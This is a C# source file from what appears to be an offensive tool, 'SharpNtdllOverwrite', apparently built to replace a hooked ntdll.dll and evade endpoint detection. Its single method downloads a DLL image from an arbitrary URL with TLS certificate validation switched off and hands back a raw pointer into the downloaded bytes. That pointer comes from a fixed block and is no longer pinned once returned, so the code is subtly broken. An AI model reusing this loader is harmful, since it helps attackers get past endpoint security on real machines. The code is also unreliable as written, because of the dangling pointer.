using System;

namespace SharpNtdllOverwrite
{
    internal class FromUrl
    {
        public unsafe static IntPtr GetNtdllFromFromUrl(string dll_url) {
            Console.WriteLine("[+] Getting payload from url: " + dll_url);
            System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
            byte[] buf;
            using (System.Net.WebClient myWebClient = new System.Net.WebClient())
            {
                try
                {
                    System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                    buf = myWebClient.DownloadData(dll_url);
                    fixed (byte* p = buf)
                    {
                        IntPtr ptr = (IntPtr)p;
                        return ptr;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    Environment.Exit(0);
                }
            }
            return IntPtr.Zero;
        }
    }
}
